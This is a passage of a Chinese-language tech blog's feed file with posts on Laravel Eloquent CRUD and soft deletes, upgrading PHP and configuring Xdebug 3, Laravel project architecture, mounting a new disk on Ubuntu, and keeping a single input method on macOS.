class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$user-&gt;name = <span class="string">"yumi"</span>;</span><br><span class="line">$user-&gt;fill([<span class="string">"email"</span> =&gt; <span class="string">"yumi@example.com"</span>]);</span><br><span class="line">$user-&gt;save();</span><br><span class="line"><span class="comment">// 返回模型对象</span></span><br><span class="line"></span><br><span class="line">$user = <span class="keyword">new</span> User(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line">$user-&gt;save();</span><br><span class="line"></span><br><span class="line">$result = User::create(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 返回模型对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 单条插入，并返回对应 ID</span></span><br><span class="line">$result = User::insertGetId(</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 返回插入记录对应ID</span></span><br></pre></td></tr></table></figure><p>批量插入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$result = User::insert([</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"boo"</span>, <span class="string">'email'</span> =&gt; <span class="string">'boo@example.com'</span>]</span><br><span class="line">    [<span class="string">"name"</span>=&gt;<span class="string">"yumi"</span>, <span class="string">'email'</span> =&gt; <span class="string">'yumi@example.com'</span>]</span><br><span class="line">]);</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br></pre></td></tr></table></figure><p>注意⚠️：此时不会触发saving、saved 模型事件</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>单条更新</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;name = <span class="string">'yumi'</span>;</span><br><span class="line">$user-&gt;save();</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br><span class="line"></span><br><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;update($data);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br><span class="line"></span><br><span class="line">$user = User::where(<span class="string">"id"</span>, <span class="number">1</span>)-&gt;update([<span class="string">'password'</span> =&gt; bcrypt(<span class="number">122410</span>)]);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br></pre></td></tr></table></figure><p>批量更新：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user = User::whereIn(<span class="string">"id"</span>, [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])-&gt;update([<span class="string">'password'</span> =&gt; bcrypt(<span class="number">122410</span>)]); </span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>单个删除</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过主键查询，删除模型</span></span><br><span class="line">$user = User::find(<span class="number">1</span>);</span><br><span class="line">$user-&gt;delete();</span><br><span class="line"><span class="comment">// 返回Boolean</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接通过主键删除</span></span><br><span class="line">User::destroy(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 返回受影响行数</span></span><br><span class="line"></span><br><span class="line">User::where(<span class="string">'id'</span>, <span class="number">1</span>)-&gt;delete();</span><br></pre></td></tr></table></figure><p>批量删除：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">User::destroy([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">User::destroy(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment">// 注：通过 Eloquent 批量删除时，deleting 和 deleted事件不会被触发，因为在进行模型删除时不会获取模型。</span></span><br><span class="line"></span><br><span class="line">User::whereIn(<span class="string">'id'</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])-&gt;delete();</span><br><span class="line"><span class="comment">// 均返回受影响行数</span></span><br></pre></td></tr></table></figure><h3 id="软删除"><a href="#软删除" class="headerlink" title="软删除"></a>软删除</h3><p>除了真实删除数据库记录，Eloquent 也可以「软删除」模型。软删除的模型并不是真的从数据库中删除了。 事实上，是在模型上设置了 <code>deleted_at</code> 属性并将其值写入数据库。如果 <code>deleted_at</code> 值非空，代表这个模型已被软删除。</p><p>如果要开启模型软删除功能，需要做好三件事情：</p><ol><li>数据库增加<code>deleted_at</code> 字段</li><li>在模型上导入 <code>Illuminate\Database\Eloquent\SoftDeletes</code>特征</li><li>同时将<code>deleted_at</code> 列添加到 <code>$dates</code> 属性</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">SoftDeletes</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SoftDeletes</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> $dates = [<span class="string">'deleted_at'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，当在模型实例上使用 <code>delete</code> 方法，当前日期时间会写入 <code>deleted_at</code> 字段。同时，查询出来的结果也会自动排除已被软删除的记录。</p><h3 id="软删除常见操作"><a href="#软删除常见操作" class="headerlink" title="软删除常见操作"></a>软删除常见操作</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 验证给定的模型实例是否已被软删除</span></span><br><span class="line"><span class="keyword">if</span> ($user-&gt;trashed()) &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 包括已软删除的模型</span></span><br><span class="line">$users = User::withTrashed()-&gt;get();</span><br><span class="line">            </span><br><span class="line"><span class="comment">// 只检索软删除模型           </span></span><br><span class="line">$users = User::onlyTrashed()-&gt;get();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 永久删除</span></span><br><span class="line">$user-&gt;forceDelete();</span><br></pre></td></tr></table></figure><p>注意⚠️：</p><ol><li>通过 Eloquent 批量删除时，deleting 和 deleted 事件不会被触发，因为在进行模型删除时不会获取模型。</li><li>通过 Eloquent 批量更新时，更新的模型不会触发 saving, saved, updating 和 updated 模型事件。这是因为在批量更新时实际上从未检索模型。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://learnku.com/docs/laravel/8.x/eloquent/9406#soft-deleting" target="_blank" rel="noopener">Eloquent 快速入门</a></li><li><a href="https://segmentfault.com/a/1190000014916636" target="_blank" rel="noopener">Laravel 中Eloquent ORM 相关操作</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>谈谈第一次使用 Laravel 开发的感想</title>
      <link href="/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/"/>
      <url>/talk-about-the-feelings-of-using-laravel-development-for-the-first-time/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来记录一下使用Laravel 开发的一些感想。</p><a id="more"></a><p>笔者最早接触的第一个PHP 框架是<code>ThinkPHP 3.2</code>，写过接口，做过网站。</p><p>后来发现了<a href="http://laravel.com" target="_blank" rel="noopener">Laravel</a> 这个框架，那时最新的版本是5.x，当时就觉得这个框架可真高级，好多从未了解到的概念。</p><p>也正是从那个时候开始了解Laravel，通过<a href="https://learnku.com/" target="_blank" rel="noopener">learnku</a> 上的系列课程进行学习，</p><p>前前后后也是花了不少时间在上面，始终没机会进入项目实战，一直停留在学习层面。</p><p>今年的第一个项目有幸使用Laravel 从零开发，当我再次捡起之前看过的课程，感觉几乎白看了，好多点完全都没印象了。</p><p>有幸遇到一位不错的项目组长，项目开发初期给了一些时间去做准备。</p><p>这一周是新项目正式开始的第一周，项目进展挺顺利的（没有拖后腿 😀），不得不说使用Laravel 开发的效率真的很高，丰富的第三方扩展包可以满足日常开发的绝大多数应用场景。</p><p>这不禁让我引发思考，为什么之前花更多的时间和精力去学习，却还没有这短短半个月的收获大呢？</p><hr><p>原因很简单：<strong>编程是技能，不是知识，技能只有在不断练习下才会有进步</strong> 。</p><p>借用一句老话来讲就是：<strong>纸上得来终觉浅，绝知此事要躬行。</strong></p><p>现在再回头看看<code>learnku.com</code> 的站长，在介绍<a href="https://learnku.com/courses/laravel-essential-training/8.x/reading-guide/9794" target="_blank" rel="noopener">如何正确阅读本书</a>时，说的一段话，真的特别好，强调“刻意练习”的重要性。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210403123344.png" alt=""></p><p>所以不能总是停留在学习阶段，有一定基础之后，就去做，遇到问题解决问题，不用太在意结果如何，动手去做就好了。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
          <category> 一些思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
            <tag> 一些思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次升级 PHP 引发的一些思考</title>
      <link href="/some-thoughts-caused-by-upgrading-php-at-a-time/"/>
      <url>/some-thoughts-caused-by-upgrading-php-at-a-time/</url>
      
        <content type="html"><![CDATA[<p>因为工作原因，今天将本地开发环境的PHP 升级到7.4 了，此前一直使用7.3。</p><p>中间遇到了一些小问题，总体还算顺利，在此记录一下。</p><a id="more"></a><h3 id="背景说明"><a href="#背景说明" class="headerlink" title="背景说明"></a>背景说明</h3><p>我并没有使用集成的开发环境，而是单独安装所需的<code>5.6</code>、<code>7.0</code>、<code>7.1</code>、<code>7.2</code>、<code>7.3</code> 版本，所以升级<code>7.4</code> 也很简单，直接使用<code>brew</code> 安装即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ brew install php@7.4</span><br></pre></td></tr></table></figure><p>但是这会带来一个新的问题：之前通过源码编译安装过的扩展，还需要再安装一次。</p><p>你可能会问，为什么还需要再安装一次呢？直接把<code>php.ini</code> 中的开启扩展配拷贝过去不就可以了吗？</p><p>我们来试试这样做会发生什么？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210331215353.png" alt=""></p><p>可以看到 PHP 并没有正常加载该扩展，这是为啥呢？</p><p>要回答这个问题，首先我们需要搞清楚，源码编译安装是怎么回事。</p><p>当我们执行<code>phpize</code> 命令后，会根据当前系统信息（PHP 版本）生成对应版本的扩展文件。</p><p>所以PHP7.3 编译生成的扩展自然就不能直接拿到PHP 7.4 中去使用了。</p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>另外想说一下Xdebug ，它是我一直在使用的一个调试扩展，非常强大。</p><p>在PHP 升起到7.4 之后，我一并安装了最新版的Xdebug（3.x），此前我一直使用 2.x 版本的，因为版本跨度比较大，刚开始问题挺多的，断点总是进不去。</p><p>起初我认为是新旧配置不兼容，挺多参数名称发生了变化，（具体可以看<a href="https://xdebug.org/docs/upgrade_guide/en" target="_blank" rel="noopener">这里</a>），当我把配置全部切换成适应新版本，还是进不去。</p><p>后来阴差阳错升级了PHPStorm，结果就能调试了…（升级之前的版本是 2020.1）</p><p>适应<code>xdebug 3.x</code>的配置如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pecl&#x2F;20190902&#x2F;xdebug.so</span><br><span class="line">xdebug.mode &#x3D; debug</span><br><span class="line">xdebug.client_host &#x3D; 127.0.0.1</span><br><span class="line">xdebug.client_port &#x3D; 9003</span><br><span class="line">xdebug.idekey&#x3D;PHPSTORM</span><br></pre></td></tr></table></figure><p>只是到最后我也没整明白到底是啥原因导致。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> 一些思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 一些思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『转载』Laravel 中大型项目架构</title>
      <link href="/laravel-medium-and-large-project-architecture/"/>
      <url>/laravel-medium-and-large-project-architecture/</url>
      
        <content type="html"><![CDATA[<p>初学者学习 Laravel 时分两种，一种是乖乖的将程式填入 MVC 架构內，导致 controller 与 model 异常的肥大，日后一样很难维护；一种是常常不知道程式改写在哪一个 class 內而犹豫不決，毕竟传统 PHP 都是一个页面一个档案。本文整理出适合 Laravel 的中大型项目架构，兼具容易维护、容易扩充与容易重复使用的特点，并且容易测试。</p><a id="more"></a><p>一个项目只有 MVC 是不够的，我们需要更完整的项目架构。</p><h2 id="Controller-过于臃肿"><a href="#Controller-过于臃肿" class="headerlink" title="Controller 过于臃肿"></a>Controller 过于臃肿</h2><p>受RoR的影响，初学者常认为 MVC 架构就是 model ,view,controller :</p><ul><li>Model 就是资料库。</li><li>Controller 负责与 HTTP 交互，调用 model 与 view。</li><li>View 就是 HTML。</li></ul><p>假如依照这个定义，以下这些需求改写在哪里呢？</p><ol><li>发送 Email，使用外部 API。</li><li>使用 PHP 写的逻辑。</li><li>依需求将显示格式作转换。</li><li>依需求是否显示某些资料。</li><li>依需求显示不同资料。</li></ol><p>其中 1, 2 属于商业逻辑，而 3, 4, 5 属于显示逻辑，若依照一般人对 MVC 的定义，model 是资料库，而 view 又是 HTML，以上这些需求都不能写在 model 与 view，只能勉强写在 controller。</p><p>因此初学者开始将大量程式写在 controller，造成 controller 的肥大难以维护。</p><h2 id="Model-过于臃肿"><a href="#Model-过于臃肿" class="headerlink" title="Model 过于臃肿"></a>Model 过于臃肿</h2><p>既然逻辑写在 controller 不方便维护，那我将逻辑都写在 model 就好了？</p><p>当你将逻辑从 controller 搬到 model 后，虽然 controller 变瘦了，但却肥了 model，model 从原本代表资料库，現在变成还要负责商业逻辑与显示逻辑，结果更慘。</p><p>Model 代表资料库吗？把它想成是 Eloquent class就好，资料库逻辑应该写在 repository 里，这也是为什么 Laravel 5 已经沒有 models目录，Eloquent class 仅仅是放在 app 根目录下而已。</p><h2 id="中大型项目架构"><a href="#中大型项目架构" class="headerlink" title="中大型项目架构"></a>中大型项目架构</h2><p>那我们改怎么写呢？別将我们的思维局限在 MVC 內 :</p><ol><li>Model : 仅当成 Eloquent class。</li><li>Repository : 辅助 model，处理资料库逻辑，然后注入到 service。</li><li>Service : 辅助 controller，处理业务逻辑，然后注入到 controller。</li><li>Controller : 接收 HTTP request，调用其他 service。</li><li>Presenter : 处理显示逻辑，然后注入到 view。</li><li>View : 使用 blade 将资料 绑定 到 HTML。</li></ol><p>上面架构我们可以发现 MVC 架构还在，由与 SOLID 的单一职责原則与依赖反转原则:</p><p>我们将资料库逻辑从 model 分离出来，由 repository 辅助 model，将 model 依赖注入进 repository。<br>我们将商业逻辑从 controller 分离出来，由 service 辅助 controller，将 service 依赖注入进 controller。<br>我們将显示逻辑从 view 分离出來，由 presenter 辅助 view，将 presenter 依赖注入进 view。</p><h2 id="建立目录"><a href="#建立目录" class="headerlink" title="建立目录"></a>建立目录</h2><p>在 app 目录下建立 Repositories，Services 与 Presenters 目录。</p><p> 別害怕建立目录！！</p><p>別害怕在 Laravel 预设目录以外建立的其他目录，根据 SOLID 的单一职责原则，class 功能越多，责任也越多，因此越违反单一职责原则，所以你应该将你的程式分割成更小的部分，每个部分都有它专属的功能，而不是一个 class 功能包山包海，也就是所谓的万能类别，所以整个方案不应该只有 MVC 三个部分，放手根据你的需求建立适当的目录，并将适当的 class 放到该目录下，只要我们的 class 有 namespace 帮我们分类即可。</p><h2 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h2><p>由于篇幅的关系，将 repository 独立成专文讨论，请参考如何使用 Repository 模式?</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>由于篇幅的关系，将 service 独立成专文讨论，请参考如何使用 Service 模式?</p><h2 id="Presenter"><a href="#Presenter" class="headerlink" title="Presenter"></a>Presenter</h2><p>由于篇幅的关系，将 presenter 独立成专文讨论，请参考如何使用 Presenter 模式?</p><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>由于现在 model、view、controller 的相依物件都已经拆开，也都使用依赖注入，因此每个部分都可以单独的做单元测试，如要测试 service，就将 repository 加以 mock，也可以将其他 service 加以 mock。</p><p>Presenter 也可以单独跑单元测试，将其他 service 加以 mock，不一定要跑验收测试才能测试显示逻辑。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>本文谈到的架构只是开始开始，你可以依照实际需求增加更多的目录与 class，当你发现你的 MVC 违反 SOLID 原则时，就大胆的将 class 从 MVC 拆开重构，然后依照以下手法 :</p><ol><li>建立新的 class 或 interface。</li><li>将相依物件依赖注入到 class。</li><li>在 class 內处理他的职责。</li><li>将 class 或 interface 注入到 controller 或 view。</li></ol><p>————————————————<br>版权声明：本文为CSDN博主「华尔街之猫」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/qq_24935119/article/details/89656569" target="_blank" rel="noopener">https://blog.csdn.net/qq_24935119/article/details/89656569</a></p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 如何挂载新硬盘</title>
      <link href="/how-to-mount-a-new-hard-disk-in-linux/"/>
      <url>/how-to-mount-a-new-hard-disk-in-linux/</url>
      
        <content type="html"><![CDATA[<p>如何将一块新的硬盘挂载到Linux 操作系统呢？</p><a id="more"></a><p>下面以<code>Ubuntu 18.04</code>的发行版作为演示。</p><p>首先查看系统当前硬盘分配情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;dev &amp;&amp; ls sd* -al</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214146.png" alt=""></p><p>默认情况下，系统硬盘标记为<code>/dev/sda</code>，<code>sda1</code>、<code>sda2</code>这些表示对应硬盘下的分区名称。</p><p>查看当前系统硬盘挂载情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ df -h</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214212.png" alt=""></p><p>可以到看，该系统当前一共挂载了两块硬盘，分别是：</p><ol><li>分区名称为 <code>/dev/sda2</code>的系统盘 10G，挂载点为<code>/</code>。</li><li>分区名称为 <code>/dev/sdb1</code>的临时盘 2.5G，挂载点为<code>/mydata</code>。</li></ol><p>现在来为该系统添加第三块硬盘，并尝试挂载到指定目录。</p><h2 id="VirtualBox-添加磁盘"><a href="#VirtualBox-添加磁盘" class="headerlink" title="VirtualBox 添加磁盘"></a>VirtualBox 添加磁盘</h2><p>添加硬盘之前，需要先将机器给停掉，右键设置，点击存储</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214327.png" alt=""></p><p>创建虚拟盘：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214341.png" alt=""></p><p>按照默认选择VDI 就好：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214403.png" alt=""></p><p>根据自身情况，选择动态分配或者固定大小</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214421.png" alt=""></p><p>这里选择分配三个G，然后点击创建。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214503.png" alt=""></p><p>将新硬盘加入进来，然后启动机器。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214613.png" alt=""></p><h2 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h2><p>连接上机器之后，再次查看所有系统硬盘：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214640.png" alt=""></p><p>可以看到这次多了一个叫做<code>sdc</code> 的硬盘，首先需要对该硬盘进行分区，然后才能挂载。</p><p>这里我只需要新增一个主分区，执行以下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (echo n; echo p; echo 1; echo ; echo ; echo w) | sudo fdisk &#x2F;dev&#x2F;sdc</span><br></pre></td></tr></table></figure><p>这条命令最终会做以下几件事情：</p><ol><li><code>echo n</code> 新增分区</li><li><code>echo p</code> 新建主分区</li><li><code>echo 1</code> 新增一个主分区</li><li><code>echo</code> 表示『回车』确定</li><li><code>echo 2</code> 写入并退出</li><li>将以上输出作为输出通过管道符传递给<code>fdisk</code>命令</li><li><code>/dev/sdc</code> 表示需要分区的硬盘</li></ol><p>将文件系统写入分区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfs -t ext4 &#x2F;dev&#x2F;sdc1</span><br></pre></td></tr></table></figure><h2 id="挂载硬盘"><a href="#挂载硬盘" class="headerlink" title="挂载硬盘"></a>挂载硬盘</h2><p>将新硬盘挂载到指定目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo mkdir &#x2F;boo &amp;&amp; sudo mount &#x2F;dev&#x2F;sdc1 &#x2F;boo</span><br></pre></td></tr></table></figure><p>再次使用<code>df -h</code>命令查看磁盘情况，可以到看新硬盘已经挂载到指定目录下了。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210325214815.png" alt=""></p><p>最后记得设置开机挂载，使用<code>blkid</code> 命令获取硬盘UUID：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -i blkid</span><br></pre></td></tr></table></figure><p>输出内容类似：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;dev&#x2F;sdc1: UUID&#x3D;&quot;f8025940-19bc-4943-9711-b431f478838e&quot; TYPE&#x3D;&quot;ext4&quot; PARTUUID&#x3D;&quot;d746a3a1-01&quot;</span><br></pre></td></tr></table></figure><p>编辑<code>/etc/fstab</code> 文件，添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UUID&#x3D;9da67a01-aaae-4979-93fd-9916f010731a &#x2F;boo ext4 defaults 0 0</span><br></pre></td></tr></table></figure><p>至此就完成了硬盘挂载的所有操作了。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://blog.csdn.net/love__coder/article/details/8270856" target="_blank" rel="noopener">虚拟机VirtualBox怎么添加新的虚拟硬盘</a></li><li><a href="https://www.imooc.com/article/28638" target="_blank" rel="noopener">Azure: 给 ubuntu 虚机挂载数据盘</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac 如何只保留一个输入法</title>
      <link href="/how-to-keep-only-one-input-method-on-mac/"/>
      <url>/how-to-keep-only-one-input-method-on-mac/</url>
      
        <content type="html"><![CDATA[<p>macOS 默认自带的是英文输入法，虽然也有简体中文，不过词库不丰富，不太好用。一般会选择安装一个第三方的输入法，这时就会有两个输入法共存了。</p><a id="more"></a><p>常常会遇到的一个痛点就是多应用切换时，下一个输入法总是不确定，有时候是中文有时候是英文。</p><p>系统输入法切换的快捷方式是<code>Control + Space</code>，而落格输入法切换中英文又是<code>Shift</code>，这就导致总是需要来回切换，这一点就很烦。</p><p>这种情况下，如果只保留一个输入法，那就不会有这种困扰了。</p><p>但是系统并不允许我们删除默认的英文输入法，不过可以一些小手段来达到目的，具体步骤如下：</p><ol><li>删除多余的输入法，只保留默认的英文输入法和正在使用的输入法</li><li>把当前输入法切换到默认的英文输入法</li><li>把<code>~/Library/Preferences/</code>路径下的<code>com.apple.HIToolbox.plist</code>文件拷贝到桌面，用Xcode 打开，找到并删除<code>AppleEnabledInputSources</code>中<code>KeyboardLayout Name</code>为<code>US</code> 那一项，然后保存。</li><li>用修改后的文件替换<code>~/Library/Preferences/</code>路径下文件</li><li>重启电脑即可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20210320090641.png" alt=""></p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://xdev.in/posts/remove-default-input-source/" target="_blank" rel="noopener">删除macOS自带的英文输入法</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mac </category>
          
          <category> Skill </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Skill </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins + Gitlab 持续集成</title>
      <link href="/jenkins-gitlab-continuous-integration/"/>
      <url>/jenkins-gitlab-continuous-integration/</url>
      
